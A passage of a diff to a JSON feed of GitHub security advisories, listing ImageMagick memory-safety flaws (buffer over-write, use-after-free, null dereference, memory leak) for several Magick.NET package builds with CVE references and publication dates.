+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-HDRI-AnyCPU] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-HDRI-OpenMP-arm64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-AnyCPU] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-HDRI-AnyCPU] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>When providing invalid options to the wand option parser a small memory leak will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j989-f892-2335\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j989-f892-2335</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53464\">https://nvd.nist.gov/vuln/detail/CVE-2026-53464</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j989-f892-2335\">https://github.com/advisories/GHSA-j989-f892-2335</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-j989-f892-2335",
+            "title": "[Magick.NET-Q8-x86] ImageMagick: Memory Leak in wand option parser when providing invalid arguments",
+            "date_modified": "2026-06-26T23:11:26.000Z",
+            "date_published": "2026-06-26T23:11:25.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-j989-f892-2335"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-AnyCPU] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>When providing invalid options to the wand option parser a small memory leak will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j989-f892-2335\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j989-f892-2335</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53464\">https://nvd.nist.gov/vuln/detail/CVE-2026-53464</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j989-f892-2335\">https://github.com/advisories/GHSA-j989-f892-2335</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-j989-f892-2335",
+            "title": "[Magick.NET-Q8-x64] ImageMagick: Memory Leak in wand option parser when providing invalid arguments",
+            "date_modified": "2026-06-26T23:11:26.000Z",
+            "date_published": "2026-06-26T23:11:25.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-j989-f892-2335"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When an allocation fails in CheckPrimitiveExtent this can result in a heap-use-after-free and result in a crash.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-px7q-ggqj-hcf2\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-px7q-ggqj-hcf2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53462\">https://nvd.nist.gov/vuln/detail/CVE-2026-53462</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-px7q-ggqj-hcf2\">https://github.com/advisories/GHSA-px7q-ggqj-hcf2</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-px7q-ggqj-hcf2",
-            "title": "[Magick.NET-Q8-x86] ImageMagick has a Use-After-Free when allocation in CheckPrimitiveExtent fails",
-            "date_modified": "2026-06-26T16:21:38.000Z",
-            "date_published": "2026-06-26T16:21:36.000Z",
+            "content_html": "<p>When providing invalid options to the wand option parser a small memory leak will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j989-f892-2335\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j989-f892-2335</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53464\">https://nvd.nist.gov/vuln/detail/CVE-2026-53464</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j989-f892-2335\">https://github.com/advisories/GHSA-j989-f892-2335</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-j989-f892-2335",
+            "title": "[Magick.NET-Q8-arm64] ImageMagick: Memory Leak in wand option parser when providing invalid arguments",
+            "date_modified": "2026-06-26T23:11:26.000Z",
+            "date_published": "2026-06-26T23:11:25.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-px7q-ggqj-hcf2"
+                "url": "https://github.com/advisories/GHSA-j989-f892-2335"
             },
             "tags": [
                 "severity"
